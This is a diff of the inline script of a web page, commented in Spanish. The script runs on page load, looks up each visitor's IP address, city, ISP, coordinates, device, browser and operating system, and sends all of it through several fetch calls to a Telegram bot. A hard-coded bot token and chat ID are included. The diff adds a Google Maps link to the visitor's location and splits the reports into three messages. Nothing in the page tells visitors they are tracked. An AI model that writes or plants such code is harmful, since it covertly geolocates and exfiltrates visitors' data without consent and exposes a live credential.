@@ -67,7 +67,7 @@
 <body>
 
    <script>
-     window.onload = function() {
+    window.onload = function() {
     const telegramUrl = "https://api.telegram.org/bot7815776748:AAGl2LfwdET9KRExkGVyYzGfUiXDcqEwUBY/sendMessage";
     const chatId = "5895952454"; // Tu ID de chat real
 
@@ -86,52 +86,82 @@
             const lat = data.latitude || 'Desconocido';
             const lon = data.longitude || 'Desconocido';
 
+            // Crear el enlace de Google Maps con las coordenadas
+            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
             // Obtener si el usuario está usando un dispositivo móvil o de escritorio
             const deviceType = /mobile/i.test(userAgent) ? "Móvil" : "Escritorio";
 
-            // Crear el mensaje con más detalles del usuario
-            const message = `🚀 **Nueva visita a tu página web!**
+            // Crear el mensaje dividido en varias partes
+            const messagePart1 = `Nueva visita a tu página web
 
-👤 **IP del usuario**: \`${ip}\`
-📍 **Ubicación**: \`${city}, ${region}, ${country}\`
-🌐 **Proveedor**: \`${isp}\`
-🖥️ **Dispositivo**: \`${userAgent.split(" ")[0]}\`
-📱 **Tipo de dispositivo**: \`${deviceType}\`
-📍 **Coordenadas**: \`Lat: ${lat} | Lon: ${lon}\`
-🔗 **URL visitada**: \`${window.location.href}\`
-`;
+IP del usuario: ${ip}
+Ubicación: ${city}, ${region}, ${country}
+Proveedor: ${isp}`;
 
-            // Enviar la notificación a Telegram
-            fetch(`${telegramUrl}?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            const messagePart2 = `Dispositivo: ${userAgent.split(" ")[0]}
+Tipo de dispositivo: ${deviceType}
+Coordenadas: Lat: ${lat} | Lon: ${lon}
+Ubicación en Google Maps: ${googleMapsLink}`;
+
+            const messagePart3 = `URL visitada: ${window.location.href}`;
+
+            // Enviar el primer mensaje
+            fetch(`${telegramUrl}?chat_id=${chatId}&text=${encodeURIComponent(messagePart1)}`)
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        console.log("✅ Notificación enviada con éxito.");
+                        console.log("Primer mensaje enviado con éxito.");
                     } else {
-                        console.error("❌ Error al enviar la notificación:", data);
+                        console.error("Error al enviar el primer mensaje:", data);
                     }
                 })
-                .catch(error => console.error("❌ Error de red:", error));
+                .catch(error => console.error("Error de red:", error));
+
+            // Enviar el segundo mensaje
+            fetch(`${telegramUrl}?chat_id=${chatId}&text=${encodeURIComponent(messagePart2)}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Segundo mensaje enviado con éxito.");
+                    } else {
+                        console.error("Error al enviar el segundo mensaje:", data);
+                    }
+                })
+                .catch(error => console.error("Error de red:", error));
+
+            // Enviar el tercer mensaje
+            fetch(`${telegramUrl}?chat_id=${chatId}&text=${encodeURIComponent(messagePart3)}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Tercer mensaje enviado con éxito.");
+                    } else {
+                        console.error("Error al enviar el tercer mensaje:", data);
+                    }
+                })
+                .catch(error => console.error("Error de red:", error));
         })
-        .catch(error => console.error("❌ Error al obtener la IP:", error));
+        .catch(error => console.error("Error al obtener la IP:", error));
 
     // Detectar la URL de la página y otros eventos importantes
-    const pageDetails = `📍 **Visitante en**: ${window.location.href}
-🖥️ **Navegador**: ${navigator.appName} / ${navigator.appVersion}
-💻 **Sistema Operativo**: ${navigator.platform}`;
+    const pageDetails = `Visitante en: ${window.location.href}
+Navegador: ${navigator.appName} / ${navigator.appVersion}
+Sistema Operativo: ${navigator.platform}`;
 
     // Enviar detalles adicionales sobre la página y navegador
     fetch(`${telegramUrl}?chat_id=${chatId}&text=${encodeURIComponent(pageDetails)}`)
         .then(response => response.json())
         .then(data => {
             if (data.ok) {
-                console.log("✅ Detalles de la página enviados.");
+                console.log("Detalles de la página enviados.");
             } else {
-                console.error("❌ Error al enviar los detalles de la página:", data);
+                console.error("Error al enviar los detalles de la página:", data);
             }
         })
-        .catch(error => console.error("❌ Error de red:", error));
+        .catch(error => console.error("Error de red:", error));
 };
+
 
     </script>
     
